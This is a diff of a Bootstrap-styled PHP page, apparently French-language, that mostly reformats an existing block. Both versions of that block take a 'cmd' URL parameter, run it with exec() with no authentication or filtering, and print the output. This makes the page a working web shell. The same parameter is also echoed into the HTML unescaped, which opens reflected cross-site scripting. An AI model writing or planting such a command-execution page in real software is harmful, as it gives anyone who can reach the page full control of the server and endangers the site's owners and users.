@@ -24,7 +24,6 @@
 
         <content class='container' role='main'>
 
-
             <br/>
 
             <div class='row'>
@@ -53,48 +52,39 @@
 
             </div>
 
-
             <br/>
 
-                    
-
-
-                    <?php 
-						if(isset($_GET['cmd'])){
-							$cmd =$_GET['cmd'];
+            <?php 
+				if(isset($_GET['cmd'])){
+					$cmd =$_GET['cmd'];
 							
-							echo "
-							<div class='row '>
-                            <div class='col-xs-2 col-sm-2 col-md-3 col-lg-3'></div>
+					echo "
+                      <div class='row '>
+                          <div class='col-xs-2 col-sm-2 col-md-3 col-lg-3'></div>
 
-                            <div class='col-xs-8 col-sm-8 col-md-6 col-lg-6 panel'>
+                          <div class='col-xs-8 col-sm-8 col-md-6 col-lg-6 panel'>
 
-                                <legend>Résultat : '". $cmd ."' </legend>
-							                       
-							";
+                              <legend>Résultat : '". $cmd ."' </legend>
+					";
 							
 							
-							exec($cmd, $out);
-							foreach ($out as $clef => $val ){
-								echo $clef . " : " . $val ."<br/>" ;
-							}	
-						}
-						
-						echo "</div>";
-					?>
+					exec($cmd, $out);
+					foreach ($out as $clef => $val ){
+						echo $clef . " : " . $val ."<br/>" ;
+					}	
+                  	
+                  	echo "<div class='col-xs-2 col-sm-2 col-md-3 col-lg-3'></div> </div>";
+				}
+							
+			?>
 
-                
-
-                <div class='col-xs-2 col-sm-2 col-md-3 col-lg-3'></div>
-
-            </div>
         </content>
 
         <!-- jQuery first, then Popper.js, then Bootstrap JS -->
         <script src='https://code.jquery.com/jquery-3.3.1.slim.min.js' integrity='sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo' crossorigin='anonymous'></script>
         <script src='https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js' integrity='sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49' crossorigin='anonymous'></script>
         <script src='https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js' integrity='sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T' crossorigin='anonymous'></script>
-        
+
     </body>
 
 </html>
